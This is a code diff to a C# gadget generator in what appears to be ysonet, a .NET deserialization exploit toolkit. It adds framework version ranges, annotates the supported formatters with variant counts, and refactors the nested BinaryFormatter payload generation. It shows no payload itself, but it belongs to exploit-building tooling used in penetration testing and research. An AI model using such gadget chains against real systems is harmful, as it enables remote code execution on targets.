@@ -16,7 +16,9 @@ namespace ysonet.Generators
         {
             return new GadgetFacetSet()
                 .WithKinds(PayloadKind.NestedDeserialization)
-                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework);
+                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
+                // getter-call chain; fired on 4.8.1
+                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
         }
 
         // SettingsPropertyValue + Getter call gadget
@@ -36,7 +38,11 @@ namespace ysonet.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "Json.NET", "Xaml", "MessagePackTypeless", "MessagePackTypelessLz4" };
+            // The "(N)" suffix is a display-only annotation meaning "this formatter
+            // carries N variants". Json.NET and Xaml build all four getter chains; the
+            // MessagePack helpers implement variant 1 only (Generate() switches back to
+            // 1 and says so), so they stay bare.
+            return new List<string> { "Json.NET (4)", "Xaml (4)", "MessagePackTypeless", "MessagePackTypelessLz4" };
         }
 
         public override string Finders()
@@ -87,8 +93,8 @@ namespace ysonet.Generators
             }
             else
             {
-                IGenerator generator = new TypeConfuseDelegateGenerator();
-                binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
+                binaryFormatterPayload = (byte[])new TypeConfuseDelegateGenerator()
+                    .GenerateInner("BinaryFormatter", inputArgs);
             }
 
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
